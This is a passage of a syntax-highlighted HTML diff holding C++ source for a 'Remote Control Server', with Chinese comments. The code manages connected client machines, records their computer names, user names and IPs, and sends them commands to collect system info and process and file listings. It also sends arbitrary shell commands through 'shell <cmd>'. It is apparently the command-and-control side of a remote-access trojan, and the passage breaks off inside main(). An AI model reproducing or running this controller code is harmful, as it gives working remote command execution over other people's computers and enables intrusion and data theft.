+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_PROCLIST:</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_FILELIST: {</span></span>
+<span class="line"><span style="color:#6A737D">                // 打印接收到的数据</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">%lu</span><span style="color:#9ECBFF">] Response:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, header.clientId);</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (header.dataLen </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    data.</span><span style="color:#B392F0">push_back</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">                    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_SHELL_OUTPUT: {</span></span>
+<span class="line"><span style="color:#6A737D">                // Shell输出处理</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (header.dataLen </span><span style="color:#F97583">>=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">bool</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#F97583">                    bool</span><span style="color:#E1E4E8"> isError </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">bool*</span><span style="color:#E1E4E8">)data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">                    const</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> output </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">bool</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                    DWORD outputLen </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> header.dataLen </span><span style="color:#F97583">-</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">bool</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                    </span></span>
+<span class="line"><span style="color:#F97583">                    if</span><span style="color:#E1E4E8"> (isError) {</span></span>
+<span class="line"><span style="color:#B392F0">                        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\033</span><span style="color:#9ECBFF">[31m"</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">  // 红色</span></span>
+<span class="line"><span style="color:#E1E4E8">                    }</span></span>
+<span class="line"><span style="color:#E1E4E8">                    </span></span>
+<span class="line"><span style="color:#B392F0">                    fwrite</span><span style="color:#E1E4E8">(output, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, outputLen, stdout);</span></span>
+<span class="line"><span style="color:#B392F0">                    fflush</span><span style="color:#E1E4E8">(stdout);</span></span>
+<span class="line"><span style="color:#E1E4E8">                    </span></span>
+<span class="line"><span style="color:#F97583">                    if</span><span style="color:#E1E4E8"> (isError) {</span></span>
+<span class="line"><span style="color:#B392F0">                        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\033</span><span style="color:#9ECBFF">[0m"</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">   // 重置颜色</span></span>
+<span class="line"><span style="color:#E1E4E8">                    }</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 客户端断开</span></span>
+<span class="line"><span style="color:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::lock_guard</span><span style="color:#F97583">&#x3C;</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::mutex</span><span style="color:#F97583">></span><span style="color:#B392F0"> lock</span><span style="color:#E1E4E8">(g_clientMutex);</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">auto&#x26;</span><span style="color:#E1E4E8"> pair : g_clients) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (pair.second.socket </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> clientSock) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Client </span><span style="color:#79B8FF">%lu</span><span style="color:#9ECBFF"> offline</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, pair.first);</span></span>
+<span class="line"><span style="color:#E1E4E8">                pair.second.isAlive </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    closesocket</span><span style="color:#E1E4E8">(clientSock);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 显示客户端列表</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> ListClients</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::lock_guard</span><span style="color:#F97583">&#x3C;</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::mutex</span><span style="color:#F97583">></span><span style="color:#B392F0"> lock</span><span style="color:#E1E4E8">(g_clientMutex);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">=== Online Clients ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-5s</span><span style="color:#79B8FF"> %-20s</span><span style="color:#79B8FF"> %-15s</span><span style="color:#79B8FF"> %-15s</span><span style="color:#79B8FF"> %s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#9ECBFF">           "ID"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Computer"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"User"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"IP"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Status"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"---------------------------------------------------------</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">auto&#x26;</span><span style="color:#E1E4E8"> pair : g_clients) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (pair.second.isAlive) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-5lu</span><span style="color:#79B8FF"> %-20s</span><span style="color:#79B8FF"> %-15s</span><span style="color:#79B8FF"> %-15s</span><span style="color:#79B8FF"> %s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                pair.first,</span></span>
+<span class="line"><span style="color:#E1E4E8">                pair.second.computerName.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(),</span></span>
+<span class="line"><span style="color:#E1E4E8">                pair.second.userName.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(),</span></span>
+<span class="line"><span style="color:#E1E4E8">                pair.second.ip.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(),</span></span>
+<span class="line"><span style="color:#9ECBFF">                "Online"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 向客户端发送命令</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> SendToClient</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> clientId</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> cmdType</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> data</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::lock_guard</span><span style="color:#F97583">&#x3C;</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::mutex</span><span style="color:#F97583">></span><span style="color:#B392F0"> lock</span><span style="color:#E1E4E8">(g_clientMutex);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (g_clients.</span><span style="color:#B392F0">count</span><span style="color:#E1E4E8">(clientId) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#F97583"> ||</span><span style="color:#F97583"> !</span><span style="color:#E1E4E8">g_clients[clientId].isAlive) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Client </span><span style="color:#79B8FF">%lu</span><span style="color:#9ECBFF"> not found or offline</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, clientId);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    SOCKET sock </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> g_clients[clientId].socket;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dataLen </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> data </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> (DWORD)</span><span style="color:#B392F0">strlen</span><span style="color:#E1E4E8">(data) </span><span style="color:#F97583">:</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">SendCommand</span><span style="color:#E1E4E8">(sock, clientId, cmdType, data, dataLen)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Command sent to client </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, clientId);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to send command</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 命令行处理</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> HandleCommand</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70"> cmdLine</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#E1E4E8"> DWORD selectedClient </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (cmdLine.</span><span style="color:#B392F0">empty</span><span style="color:#E1E4E8">()) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (cmdLine </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "list"</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        ListClients</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), </span><span style="color:#9ECBFF">"select "</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        selectedClient </span><span style="color:#F97583">=</span><span style="color:#B392F0"> atoi</span><span style="color:#E1E4E8">(cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 7</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Selected client: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, selectedClient);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (cmdLine </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "sysinfo"</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        SendToClient</span><span style="color:#E1E4E8">(selectedClient, CMD_SYSINFO);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (cmdLine </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "proclist"</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        SendToClient</span><span style="color:#E1E4E8">(selectedClient, CMD_PROCLIST);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), </span><span style="color:#9ECBFF">"filelist "</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        SendToClient</span><span style="color:#E1E4E8">(selectedClient, CMD_FILELIST, cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 9</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), </span><span style="color:#9ECBFF">"shell "</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        SendToClient</span><span style="color:#E1E4E8">(selectedClient, CMD_SHELL, cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 6</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (cmdLine </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "exit"</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        g_serverRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Unknown command: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, cmdLine.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Available commands: list, select, sysinfo, proclist, filelist, shell, exit</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 命令行交互线程</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> CommandLoop</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">Commands:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  list              - List online clients</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  select &#x3C;id>       - Select client</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  sysinfo           - Get system info</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  proclist          - Get process list</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  filelist &#x3C;path>   - List directory</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  shell &#x3C;cmd>       - Execute command</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  exit              - Exit server</span><span style="color:#79B8FF">\n\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> cmdLine[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (g_serverRunning) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"> "</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">fgets</span><span style="color:#E1E4E8">(cmdLine, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(cmdLine), stdin)) {</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        cmdLine[</span><span style="color:#B392F0">strcspn</span><span style="color:#E1E4E8">(cmdLine, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\r\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        HandleCommand</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#E1E4E8">(cmdLine));</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"========================================</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"     Remote Control Server              </span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"========================================</span><span style="color:#79B8FF">\n\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 初始化Winsock</span></span>
+<span class="line"><span style="color:#E1E4E8">    WSADATA wsa;</span></span>
+<span class="line"><span style="color:#B392F0">    WSAStartup</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">MAKEWORD</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">wsa);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 创建监听Socket</span></span>
+<span class="line"><span style="color:#E1E4E8">    SOCKET listenSock </span><span style="color:#F97583">=</span><span style="color:#B392F0"> socket</span><span style="color:#E1E4E8">(AF_INET, SOCK_STREAM, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (listenSock </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_SOCKET) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to create socket</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WSACleanup</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    sockaddr_in serverAddr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">    serverAddr.sin_family </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> AF_INET;</span></span>
+<span class="line"><span style="color:#E1E4E8">    serverAddr.sin_port </span><span style="color:#F97583">=</span><span style="color:#B392F0"> htons</span><span style="color:#E1E4E8">(SERVER_PORT);</span></span>
+<span class="line"><span style="color:#E1E4E8">    serverAddr.sin_addr.s_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> INADDR_ANY;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">bind</span><span style="color:#E1E4E8">(listenSock, (sockaddr</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">serverAddr, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(serverAddr)) </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> SOCKET_ERROR) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Bind failed</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        closesocket</span><span style="color:#E1E4E8">(listenSock);</span></span>
+<span class="line"><span style="color:#B392F0">        WSACleanup</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">listen</span><span style="color:#E1E4E8">(listenSock, MAX_CLIENTS) </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> SOCKET_ERROR) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Listen failed</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        closesocket</span><span style="color:#E1E4E8">(listenSock);</span></span>
+<span class="line"><span style="color:#B392F0">        WSACleanup</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Server listening on port </span><span style="color:#79B8FF">%d\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, SERVER_PORT);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 接受连接线程</span></span>
